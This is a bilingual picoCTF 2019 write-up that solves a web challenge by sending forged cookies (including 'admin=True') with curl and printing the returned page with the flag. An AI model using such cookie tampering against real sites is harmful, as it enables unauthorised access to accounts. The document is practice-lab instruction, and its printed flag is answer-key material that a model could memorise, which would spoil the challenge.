## Descripción
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594

La fábrica oculta cosas a todos sus usuarios. ¿Puedes iniciar sesión como Joe y encontrar lo que han estado mirando? `https://jupiter.challenges.picoctf.org/problem/13594/` ([enlace](https://jupiter.challenges.picoctf.org/problem/13594/)) o http://jupiter.challenges. picoctf.org:13594
### Pistas
1. Hmm it doesn't seem to check anyone's password, except for Joe's?
### Solución
1. Hay que encontrar y verificar la cookie a buscar, con curl en Linux:
```
hellbroone-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie:username=caca;password=tumama;admin=True"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>
```
### Notas Adicionales
Para este reto tuvimos que usar el comando curl, que es muy útil para verificar URLs y transferir archivos en **Linux**.
Con esto, simplemente hay que poner la cookie como encabezado con *-H*.
### Referencias
https://play.picoctf.org/practice/challenge/46
https://jupiter.challenges.picoctf.org/problem/13594/
